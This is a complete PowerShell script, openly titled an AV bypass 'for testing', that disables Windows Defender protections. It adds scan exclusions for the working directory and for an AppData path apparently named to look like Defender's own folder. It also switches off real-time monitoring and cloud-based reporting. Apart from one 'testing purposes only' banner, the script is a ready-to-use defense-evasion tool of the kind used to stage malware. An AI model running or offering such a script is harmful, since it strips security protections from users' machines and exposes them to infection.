# Temporary AV Bypass Script for Testing
# Run as Administrator

Write-Host "🛡️ Configuring Windows Defender for Testing..." -ForegroundColor Yellow

try {
    # Add exclusion for current directory
    $currentDir = Get-Location
    Add-MpPreference -ExclusionPath $currentDir.Path
    Write-Host "✅ Added exclusion: $($currentDir.Path)" -ForegroundColor Green
    
    # Add exclusion for AppData
    $appData = "$env:APPDATA\Microsoft\Defender"
    Add-MpPreference -ExclusionPath $appData
    Write-Host "✅ Added exclusion: $appData" -ForegroundColor Green
    
    # Temporarily disable real-time protection
    Set-MpPreference -DisableRealtimeMonitoring $true
    Write-Host "✅ Disabled real-time monitoring temporarily" -ForegroundColor Green
    
    # Disable cloud protection
    Set-MpPreference -MAPSReporting Disabled
    Write-Host "✅ Disabled cloud protection" -ForegroundColor Green
    
    Write-Host "`n🎯 Testing environment configured!" -ForegroundColor Cyan
    Write-Host "Note: This is for testing purposes only" -ForegroundColor Yellow
    
} catch {
    Write-Host "❌ Error: $_" -ForegroundColor Red
    Write-Host "Make sure to run as Administrator" -ForegroundColor Yellow
}

Write-Host "`nPress any key to continue..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
